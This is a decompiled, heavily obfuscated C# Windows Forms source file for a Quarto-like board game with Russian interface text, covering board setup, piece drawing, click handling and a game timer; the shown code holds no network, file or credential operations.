using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = 400080476;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x3B9C8A3Cu) % 7u)
					{
					case 6u:
						Point = point;
						num = ((int)num2 * -591649094) ^ 0x7F366EF0;
						continue;
					case 5u:
						Dark = dark;
						num = (int)((num2 * 2113579786) ^ 0x6C7CFE55);
						continue;
					case 3u:
						Big = big;
						num = ((int)num2 * -1298030626) ^ -1117159177;
						continue;
					case 2u:
						Square = square;
						num = ((int)num2 * -2313615) ^ -1427835696;
						continue;
					case 1u:
						num = (int)(num2 * 1699871733) ^ -543387115;
						continue;
					default:
						return;
					case 0u:
						break;
					case 4u:
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			Dark = copy.Dark;
			Big = copy.Big;
			Square = copy.Square;
			Point = copy.Point;
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		InitializeComponent();
		Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
		pictureBox = new PictureBox[4, 4];
		borderBox = new PictureBox[4, 4];
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				double num = ((j < 2) ? 0.0 : 4.1);
				PictureBox[,] array = pictureBox;
				int num2 = i;
				int num3 = j;
				PictureBox obj = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
				Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)j + num) * (double)size), 4 + i * size));
				Form1.smethod_5((Control)(object)obj, Color.White);
				array[num2, num3] = obj;
				Form1.smethod_6((Control)(object)pictureBox[i, j], new MouseEventHandler(PictureBoxIJ_MouseDown));
				PictureBox[,] array2 = borderBox;
				int num4 = i;
				int num5 = j;
				PictureBox obj2 = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
				Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)j + num) * (double)size), 1 + i * size));
				Form1.smethod_7((Control)(object)obj2, bool_0: false);
				array2[num4, num5] = obj2;
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[i, j]);
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[i, j]);
			}
		}
		Form3 form_ = new Form3();
		Form1.smethod_10((Form)(object)form_, (Form)(object)this);
		menu = (Form)(object)form_;
		Form1.smethod_11((Control)(object)menu);
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 1436192944;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x7CFAF637u) % 8u)
				{
				case 7u:
					Form1.smethod_15(timer1);
					num = (int)((num2 * 1302884748) ^ 0x1322F6C6);
					continue;
				case 6u:
					Form1.smethod_14(menu);
					num = ((int)num2 * -554258338) ^ -1549274014;
					continue;
				case 5u:
					num = (int)((num2 * 1410469233) ^ 0x460B907A);
					continue;
				case 3u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 1962930351;
						num4 = 1962930351;
					}
					else
					{
						num3 = 352830979;
						num4 = 352830979;
					}
					num = num3 ^ ((int)num2 * -627968850);
					continue;
				}
				case 2u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = 883722543;
					continue;
				}
				case 0u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = 217070124;
					continue;
				default:
					return;
				case 4u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		bool flag = default(bool);
		int num4 = default(int);
		int num3 = default(int);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -341735452;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xD8A9E771u) % 18u)
				{
				case 17u:
					num = -352208576;
					continue;
				case 16u:
					flag = num4 < 4;
					num = -2096766384;
					continue;
				case 14u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: false);
					num = (int)(num2 * 1279130149) ^ -1412235587;
					continue;
				case 12u:
					num4 = 0;
					num = -1045801949;
					continue;
				case 11u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					Paint_Storage();
					num = ((int)num2 * -482065080) ^ 0x5A4E7606;
					continue;
				case 10u:
				{
					int num7;
					int num8;
					if (!flag2)
					{
						num7 = -927108073;
						num8 = -927108073;
					}
					else
					{
						num7 = -530003415;
						num8 = -530003415;
					}
					num = num7 ^ ((int)num2 * -540782587);
					continue;
				}
				case 9u:
					flag2 = num3 < 4;
					num = -654285875;
					continue;
				case 8u:
					Paint_Board();
					num = ((int)num2 * -875782458) ^ 0x2B4FA716;
					continue;
				case 7u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = 1087499706;
						num6 = 1087499706;
					}
					else
					{
						num5 = 965548319;
						num6 = 965548319;
					}
					num = num5 ^ ((int)num2 * -241833337);
					continue;
				}
				case 6u:
					num4++;
					num = (int)((num2 * 262891617) ^ 0x3AF07EB5);
					continue;
				case 5u:
					storage[num3, num4] = new Figurine(num3 < 2, num4 % 2 == 0, num4 < 2, num3 % 2 == 1);
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = ((int)num2 * -1312049760) ^ 0x6C2A8DC3;
					continue;
				case 4u:
					num = ((int)num2 * -601181015) ^ -2001741682;
					continue;
				case 3u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)(num2 * 86796212) ^ -1737945312;
					continue;
				case 2u:
					num3++;
					num = ((int)num2 * -451679254) ^ 0x4E41D982;
					continue;
				case 1u:
					board = new Figurine[4, 4];
					num = (int)((num2 * 1195034178) ^ 0x2285DBD5);
					continue;
				case 0u:
					storage = new Figurine[4, 4];
					num3 = 0;
					num = ((int)num2 * -599701985) ^ 0x32E60097;
					continue;
				default:
					return;
				case 13u:
					break;
				case 15u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
		float num8 = default(float);
		float num7 = default(float);
		float num9 = default(float);
		float num10 = default(float);
		bool dark = default(bool);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		int num11 = default(int);
		int num12 = default(int);
		float num13 = default(float);
		bool point = default(bool);
		bool big = default(bool);
		bool flag = default(bool);
		bool square = default(bool);
		while (true)
		{
			int num = -2023040938;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x98C66847u) % 39u)
				{
				case 38u:
					num = (int)(num2 * 2098761779) ^ -281755530;
					continue;
				case 37u:
					num8 = 1f - num7 * 0.9f / (float)Form1.smethod_27(2.0);
					num9 = (float)size * num7;
					num10 = (float)size * (num8 / 2f);
					num = -1715543426;
					continue;
				case 36u:
				{
					int num5;
					int num6;
					if (!dark)
					{
						num5 = 1184172064;
						num6 = 1184172064;
					}
					else
					{
						num5 = 962208858;
						num6 = 962208858;
					}
					num = num5 ^ (int)(num2 * 1413539844);
					continue;
				}
				case 35u:
					num10 = (float)size * (num8 / 2f);
					num = (int)(num2 * 1843107333) ^ -1966640557;
					continue;
				case 34u:
					Form1.smethod_28(graphics_, brush_, num10 + (float)(num11 * size), num10 + (float)(num12 * size), num13, num13);
					num = ((int)num2 * -1603398022) ^ -77249564;
					continue;
				case 33u:
					num = (int)((num2 * 644149485) ^ 0x6EC93198);
					continue;
				case 32u:
					num = -1682102834;
					continue;
				case 31u:
					point = board[num12, num11].Point;
					num = ((int)num2 * -94828744) ^ -1334958934;
					continue;
				case 30u:
					big = board[num12, num11].Big;
					num = -1264245419;
					continue;
				case 29u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1873696702) ^ -1832772916;
					continue;
				case 28u:
					num7 = 1f;
					num = ((int)num2 * -1927486637) ^ -659380642;
					continue;
				case 27u:
					dark = board[num12, num11].Dark;
					num = (int)((num2 * 1201302318) ^ 0x52141AA8);
					continue;
				case 26u:
					num8 = 1f - num7 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -1069828907;
					continue;
				case 25u:
				{
					int num20;
					int num21;
					if (big)
					{
						num20 = 39522062;
						num21 = 39522062;
					}
					else
					{
						num20 = 1755437054;
						num21 = 1755437054;
					}
					num = num20 ^ ((int)num2 * -1439179412);
					continue;
				}
				case 24u:
					num13 = num9 * 0.4f / (float)Form1.smethod_27(2.0);
					num = (int)((num2 * 546711319) ^ 0x356AEF29);
					continue;
				case 23u:
					num = (int)(num2 * 1790163613) ^ -1597316521;
					continue;
				case 22u:
					num13 = num9 * 0.9f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -795014185) ^ -1219883154;
					continue;
				case 21u:
					Form1.smethod_24(graphics_, brush_, num10 + (float)(num11 * size), num10 + (float)(num12 * size), num13, num13);
					num = -530566775;
					continue;
				case 20u:
				{
					int num18;
					int num19;
					if (!flag)
					{
						num18 = -379227143;
						num19 = -379227143;
					}
					else
					{
						num18 = -1392769741;
						num19 = -1392769741;
					}
					num = num18 ^ ((int)num2 * -2128461561);
					continue;
				}
				case 19u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num11 + 0.05f) * (float)size, ((float)num12 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					flag = board[num12, num11] != null;
					num = ((int)num2 * -308864116) ^ -187603269;
					continue;
				case 18u:
					num7 = 0.7f;
					num = -291155299;
					continue;
				case 17u:
				{
					int num17;
					if (num12 >= 4)
					{
						num = -1129561322;
						num17 = -1129561322;
					}
					else
					{
						num = -991032533;
						num17 = -991032533;
					}
					continue;
				}
				case 16u:
					num = -1314706207;
					continue;
				case 15u:
					num11 = 0;
					num = -1734591475;
					continue;
				case 14u:
					num12++;
					num = ((int)num2 * -1231654998) ^ -1733006881;
					continue;
				case 13u:
					num = ((int)num2 * -201500451) ^ 0x653A88BF;
					continue;
				case 12u:
					num = (int)(num2 * 2136166670) ^ -799875309;
					continue;
				case 11u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -291588821) ^ 0x7D553771;
					continue;
				case 10u:
					num = -1018264951;
					continue;
				case 8u:
				{
					int num16;
					if (num11 >= 4)
					{
						num = -1447138874;
						num16 = -1447138874;
					}
					else
					{
						num = -935023367;
						num16 = -935023367;
					}
					continue;
				}
				case 7u:
				{
					int num14;
					int num15;
					if (square)
					{
						num14 = 1716757748;
						num15 = 1716757748;
					}
					else
					{
						num14 = 2087221426;
						num15 = 2087221426;
					}
					num = num14 ^ (int)(num2 * 1395191954);
					continue;
				}
				case 6u:
					square = board[num12, num11].Square;
					num = (int)((num2 * 788381356) ^ 0x17AA9113);
					continue;
				case 5u:
					brush_ = Form1.smethod_26();
					num = -410586434;
					continue;
				case 4u:
					num11++;
					num = ((int)num2 * -514866246) ^ -729518447;
					continue;
				case 3u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num12 = 0;
					num = (int)(num2 * 402049870) ^ -1300623972;
					continue;
				case 2u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num10 + (float)(num11 * size), num10 + (float)(num12 * size), num13, num13);
					num = (int)(num2 * 545698815) ^ -1929639243;
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (point)
					{
						num3 = 246024344;
						num4 = 246024344;
					}
					else
					{
						num3 = 229163412;
						num4 = 229163412;
					}
					num = num3 ^ ((int)num2 * -474013578);
					continue;
				}
				default:
					return;
				case 0u:
					break;
				case 9u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		bool dark = default(bool);
		int num15 = default(int);
		int num13 = default(int);
		bool point = default(bool);
		bool flag = default(bool);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num6 = default(float);
		float num14 = default(float);
		float num5 = default(float);
		float num3 = default(float);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		float num4 = default(float);
		bool big = default(bool);
		while (true)
		{
			int num = -1006261739;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xE0E3D3EFu) % 39u)
				{
				case 38u:
				{
					int num20;
					int num21;
					if (!dark)
					{
						num20 = 234330469;
						num21 = 234330469;
					}
					else
					{
						num20 = 1084476030;
						num21 = 1084476030;
					}
					num = num20 ^ ((int)num2 * -60677412);
					continue;
				}
				case 37u:
					num15 = 0;
					num = (int)(num2 * 1005617040) ^ -788653349;
					continue;
				case 36u:
					num13 = 0;
					num = -1513924190;
					continue;
				case 35u:
				{
					int num11;
					int num12;
					if (!point)
					{
						num11 = -600193942;
						num12 = -600193942;
					}
					else
					{
						num11 = -206209886;
						num12 = -206209886;
					}
					num = num11 ^ ((int)num2 * -706412431);
					continue;
				}
				case 34u:
					num = ((int)num2 * -732761111) ^ -976352909;
					continue;
				case 33u:
				{
					int num22;
					if (num15 >= 4)
					{
						num = -441720457;
						num22 = -441720457;
					}
					else
					{
						num = -1839193373;
						num22 = -1839193373;
					}
					continue;
				}
				case 32u:
					num = (int)(num2 * 1362897707) ^ -1890978510;
					continue;
				case 31u:
				{
					int num9;
					int num10;
					if (flag)
					{
						num9 = -560950533;
						num10 = -560950533;
					}
					else
					{
						num9 = -1567557781;
						num10 = -1567557781;
					}
					num = num9 ^ (int)(num2 * 25751484);
					continue;
				}
				case 29u:
					num13++;
					num = -1901546728;
					continue;
				case 28u:
					num = ((int)num2 * -1320059812) ^ 0x14A34CB4;
					continue;
				case 27u:
					Form1.smethod_28(graphics_, brush_, num6, num6, num14, num14);
					num = (int)((num2 * 1311576076) ^ 0x27258D7A);
					continue;
				case 26u:
					dark = storage[num15, num13].Dark;
					num = ((int)num2 * -1663536043) ^ -1055216147;
					continue;
				case 25u:
					num5 = 1f - num3 * 0.4f / (float)Form1.smethod_27(2.0);
					num6 = (float)size * (num5 / 2f) - 4f;
					num = -262689543;
					continue;
				case 24u:
					num15++;
					num = ((int)num2 * -714484937) ^ -1147957266;
					continue;
				case 23u:
					brush_ = Form1.smethod_26();
					num = -1165497456;
					continue;
				case 22u:
				{
					int num18;
					int num19;
					if (flag2)
					{
						num18 = -371839890;
						num19 = -371839890;
					}
					else
					{
						num18 = -84899891;
						num19 = -84899891;
					}
					num = num18 ^ ((int)num2 * -726006299);
					continue;
				}
				case 21u:
					num = ((int)num2 * -1421364471) ^ 0xC028A95;
					continue;
				case 20u:
					Form1.smethod_20(pictureBox[num15, num13], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num15, num13]), Form1.smethod_16((Control)(object)pictureBox[num15, num13])));
					num = ((int)num2 * -1601061204) ^ 0x774818EC;
					continue;
				case 19u:
				{
					int num16;
					int num17;
					if (flag3)
					{
						num16 = -639416355;
						num17 = -639416355;
					}
					else
					{
						num16 = -430786498;
						num17 = -430786498;
					}
					num = num16 ^ ((int)num2 * -1088230234);
					continue;
				}
				case 18u:
					num14 = num4 * 0.4f / (float)Form1.smethod_27(2.0);
					point = storage[num15, num13].Point;
					num = ((int)num2 * -192722922) ^ -1625449661;
					continue;
				case 17u:
					num3 = 1f;
					num = ((int)num2 * -338750783) ^ -1465231013;
					continue;
				case 16u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num6, num6, num14, num14);
					num = ((int)num2 * -1879091381) ^ 0x4F584E55;
					continue;
				case 15u:
					num = ((int)num2 * -451530376) ^ -269865638;
					continue;
				case 14u:
					brush_ = Form1.smethod_25();
					num = (int)((num2 * 1106935272) ^ 0x7352241A);
					continue;
				case 13u:
					flag3 = storage[num15, num13] != null;
					num = -744629459;
					continue;
				case 12u:
					Form1.smethod_30((Control)(object)pictureBox[num15, num13]);
					num = -1648214542;
					continue;
				case 11u:
					num = ((int)num2 * -983690041) ^ 0x15AE0DA5;
					continue;
				case 10u:
					num3 = 0.7f;
					num = -800253521;
					continue;
				case 9u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num15, num13]));
					num = ((int)num2 * -1136095377) ^ -1370774659;
					continue;
				case 8u:
					num5 = 1f - num3 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -1501728117;
					continue;
				case 7u:
					big = storage[num15, num13].Big;
					num = -376060822;
					continue;
				case 6u:
					num = (int)(num2 * 657372714) ^ -2079420038;
					continue;
				case 5u:
					num14 = num4 * 0.9f / (float)Form1.smethod_27(2.0);
					flag2 = num13 < 2;
					num = (int)((num2 * 1178241781) ^ 0x7F9CF42C);
					continue;
				case 4u:
					Form1.smethod_24(graphics_, brush_, num6, num6, num14, num14);
					num = -1805817701;
					continue;
				case 3u:
					flag = num13 < 4;
					num = -1415533553;
					continue;
				case 1u:
				{
					int num7;
					int num8;
					if (!big)
					{
						num7 = 1913322628;
						num8 = 1913322628;
					}
					else
					{
						num7 = 1341784079;
						num8 = 1341784079;
					}
					num = num7 ^ ((int)num2 * -948108284);
					continue;
				}
				case 0u:
					num4 = (float)size * num3;
					num6 = (float)size * (num5 / 2f) - 4f;
					num = (int)(num2 * 1851607287) ^ -178063080;
					continue;
				default:
					return;
				case 2u:
					break;
				case 30u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		bool flag2 = default(bool);
		int num11 = default(int);
		bool flag = default(bool);
		int num3 = default(int);
		int num4 = default(int);
		while (true)
		{
			int num = 854801476;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x7207D18Fu) % 28u)
				{
				case 27u:
				{
					int num9;
					int num10;
					if (flag2)
					{
						num9 = 1401305430;
						num10 = 1401305430;
					}
					else
					{
						num9 = 1795520557;
						num10 = 1795520557;
					}
					num = num9 ^ ((int)num2 * -1199619767);
					continue;
				}
				case 26u:
				{
					int num7;
					int num8;
					if (turn)
					{
						num7 = 2062199443;
						num8 = 2062199443;
					}
					else
					{
						num7 = 454945027;
						num8 = 454945027;
					}
					num = num7 ^ (int)(num2 * 999846562);
					continue;
				}
				case 24u:
					num = (int)((num2 * 1870442978) ^ 0x7861EA6A);
					continue;
				case 23u:
					Form1_Load(this, Form1.smethod_31());
					num = (int)((num2 * 1903030495) ^ 0x4B9B2ABC);
					continue;
				case 22u:
				{
					int num12 = Form1.smethod_33(rnd, 4);
					Form1.smethod_5((Control)(object)borderBox[num11, num12], Color.Blue);
					num = ((int)num2 * -1147783732) ^ 0x4200FC5D;
					continue;
				}
				case 21u:
					flag = num3 < 4;
					num = 663697175;
					continue;
				case 20u:
					num = (int)((num2 * 1376055935) ^ 0x23D515E);
					continue;
				case 19u:
					num11 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -333703491) ^ -932947322;
					continue;
				case 18u:
					step = 1;
					num = ((int)num2 * -912054476) ^ -2091076133;
					continue;
				case 17u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					step = 0;
					num = ((int)num2 * -89909330) ^ 0xE5F6D75;
					continue;
				case 16u:
					num = (int)((num2 * 13125272) ^ 0x66CE8DAA);
					continue;
				case 15u:
					num = ((int)num2 * -518377691) ^ -1725722777;
					continue;
				case 14u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 1553659965) ^ -660806116;
					continue;
				case 13u:
					num = ((int)num2 * -129439869) ^ -1341480973;
					continue;
				case 12u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = 1834408568;
					continue;
				case 11u:
					flag2 = num4 < 4;
					num = 1114413920;
					continue;
				case 9u:
					num = (int)((num2 * 653127021) ^ 0x2EEF8031);
					continue;
				case 8u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = -64477467;
						num6 = -64477467;
					}
					else
					{
						num5 = -746914377;
						num6 = -746914377;
					}
					num = num5 ^ ((int)num2 * -1900922323);
					continue;
				}
				case 7u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					Form1.smethod_35(timer1, bool_0: true);
					num = (int)((num2 * 1923537791) ^ 0x1086AD26);
					continue;
				case 6u:
					num4++;
					num = (int)(num2 * 1169706173) ^ -1957873626;
					continue;
				case 5u:
					num4 = 0;
					num = (int)(num2 * 1121410768) ^ -716976918;
					continue;
				case 4u:
					Form1.smethod_7((Control)(object)pictureBox[num4, num3], bool_0: true);
					num = 838345966;
					continue;
				case 3u:
					num3++;
					num = ((int)num2 * -1460387374) ^ 0x4B4123C4;
					continue;
				case 2u:
					num3 = 0;
					num = 2102892083;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = (int)((num2 * 1133317783) ^ 0x7BC9812);
					continue;
				case 0u:
					num = 683512120;
					continue;
				case 10u:
					break;
				default:
					Form1.smethod_36(timer1);
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		while (true)
		{
			int num = 1370137434;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x323D2E55u) % 3u)
				{
				case 1u:
					goto IL_0003;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_0003:
				time = time.AddSeconds(1.0);
				Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
				num = ((int)num2 * -1814372300) ^ -1195825490;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Expected O, but got Unknown
		bool flag2 = default(bool);
		int num3 = default(int);
		bool flag3 = default(bool);
		int num4 = default(int);
		bool flag4 = default(bool);
		int num5 = default(int);
		int num6 = default(int);
		bool flag = default(bool);
		Point point = default(Point);
		while (true)
		{
			int num = -648839369;
			while (true)
			{
				uint num2;
				int num13;
				switch ((num2 = (uint)num ^ 0xC87095D9u) % 23u)
				{
				case 22u:
					flag2 = num3 < 4;
					num = -1509931854;
					continue;
				case 21u:
					flag3 = num4 < 4;
					num = -189079887;
					continue;
				case 20u:
				{
					int num9;
					int num10;
					if (flag2)
					{
						num9 = 325241696;
						num10 = 325241696;
					}
					else
					{
						num9 = 1869077590;
						num10 = 1869077590;
					}
					num = num9 ^ (int)(num2 * 458122162);
					continue;
				}
				case 19u:
				{
					int num14;
					int num15;
					if (flag4)
					{
						num14 = 844490991;
						num15 = 844490991;
					}
					else
					{
						num14 = 1743144201;
						num15 = 1743144201;
					}
					num = num14 ^ (int)(num2 * 1415448117);
					continue;
				}
				case 18u:
				{
					int num11;
					int num12;
					if (!flag3)
					{
						num11 = 2031190276;
						num12 = 2031190276;
					}
					else
					{
						num11 = 537038232;
						num12 = 537038232;
					}
					num = num11 ^ ((int)num2 * -1377019544);
					continue;
				}
				case 17u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)((num2 * 1825988153) ^ 0x39E5EA6A);
					continue;
				case 16u:
					if (storage[num5, num6] != null)
					{
						num = -1330661681;
						continue;
					}
					num13 = 0;
					goto IL_00e0;
				case 15u:
					num13 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num5, num6]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_00e0;
				case 14u:
				{
					int num7;
					int num8;
					if (flag)
					{
						num7 = -1643454833;
						num8 = -1643454833;
					}
					else
					{
						num7 = -1260259977;
						num8 = -1260259977;
					}
					num = num7 ^ (int)(num2 * 1076558482);
					continue;
				}
				case 13u:
					num = ((int)num2 * -457134455) ^ -977328682;
					continue;
				case 12u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = ((int)num2 * -724107634) ^ 0x75BD5FF0;
					continue;
				case 11u:
					num4 = 0;
					num = -809738254;
					continue;
				case 9u:
					num5 = point.Y / size;
					num = (int)(num2 * 355389663) ^ -1163334324;
					continue;
				case 8u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num6 = point.X / size;
					flag = num6 > 1;
					num = ((int)num2 * -1234071568) ^ -1275681315;
					continue;
				case 7u:
					num4++;
					num = (int)((num2 * 717361171) ^ 0x3A14764A);
					continue;
				case 6u:
					num = (int)(num2 * 1638532303) ^ -240724906;
					continue;
				case 5u:
					num6 -= 4;
					num = (int)((num2 * 673529928) ^ 0x49B8948F);
					continue;
				case 3u:
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.Red);
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -1232518221) ^ -427260877;
					continue;
				case 2u:
					num3++;
					num = ((int)num2 * -1483903784) ^ -1993620736;
					continue;
				case 1u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = -64227526;
					continue;
				case 0u:
					num3 = 0;
					num = ((int)num2 * -831774661) ^ 0x1C4667B9;
					continue;
				default:
					return;
				case 4u:
					break;
				case 10u:
					return;
					IL_00e0:
					flag4 = (byte)num13 != 0;
					num = -2077049016;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0240: Unknown result type (might be due to invalid IL or missing references)
		//IL_0256: Expected O, but got Unknown
		int num7 = default(int);
		int num8 = default(int);
		bool flag3 = default(bool);
		int num9 = default(int);
		Graphics graphics_ = default(Graphics);
		bool flag2 = default(bool);
		int num3 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -679326489;
			while (true)
			{
				uint num2;
				int num6;
				switch ((num2 = (uint)num ^ 0x9B608D3Fu) % 27u)
				{
				case 26u:
					Paint_Board();
					num = (int)(num2 * 1493383492) ^ -1940277359;
					continue;
				case 25u:
					if (board[num7, num8] == null)
					{
						num = -410995624;
						num6 = -410995624;
						continue;
					}
					goto IL_003d;
				case 24u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = (int)(num2 * 1449563016) ^ -756519175;
					continue;
				case 23u:
					flag3 = num9 < 4;
					num = -2128741786;
					continue;
				case 22u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num8 + 0.05f) * (float)size, ((float)num7 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)(num2 * 688671535) ^ -1234940877;
					continue;
				case 21u:
					Form1.smethod_45(graphics_);
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 1633612324) ^ -1032659901;
					continue;
				case 20u:
				{
					int num12;
					int num13;
					if (flag2)
					{
						num12 = 1180956239;
						num13 = 1180956239;
					}
					else
					{
						num12 = 1160739152;
						num13 = 1160739152;
					}
					num = num12 ^ ((int)num2 * -1350539457);
					continue;
				}
				case 19u:
					num3++;
					num = -1223558047;
					continue;
				case 18u:
					num8 = Form1.smethod_38(e) / size;
					num = ((int)num2 * -1667258647) ^ -1660660040;
					continue;
				case 17u:
				{
					int num10;
					int num11;
					if (!flag3)
					{
						num10 = -2062466257;
						num11 = -2062466257;
					}
					else
					{
						num10 = -1060455317;
						num11 = -1060455317;
					}
					num = num10 ^ ((int)num2 * -753946578);
					continue;
				}
				case 16u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num9, num3]), num8 * size + 4, num7 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 1768098191) ^ 0x6F0BE374);
					continue;
				case 15u:
					num9++;
					num = (int)((num2 * 750383270) ^ 0x15B3183F);
					continue;
				case 14u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -1324973771) ^ -2117106785;
					continue;
				case 13u:
					flag = num3 < 4;
					num = -2075509105;
					continue;
				case 12u:
					num7 = Form1.smethod_39(e) / size;
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = (int)(num2 * 310732309) ^ -844825059;
						continue;
					}
					goto IL_003d;
				case 11u:
					num = ((int)num2 * -838187936) ^ -1703270799;
					continue;
				case 10u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -1452573573) ^ 0x7BC03807;
					continue;
				case 8u:
					num = ((int)num2 * -1810723185) ^ 0x77A1BA8C;
					continue;
				case 7u:
					num9 = 0;
					num = ((int)num2 * -685626734) ^ -1377867677;
					continue;
				case 6u:
					num = (int)(num2 * 1951002606) ^ -851169261;
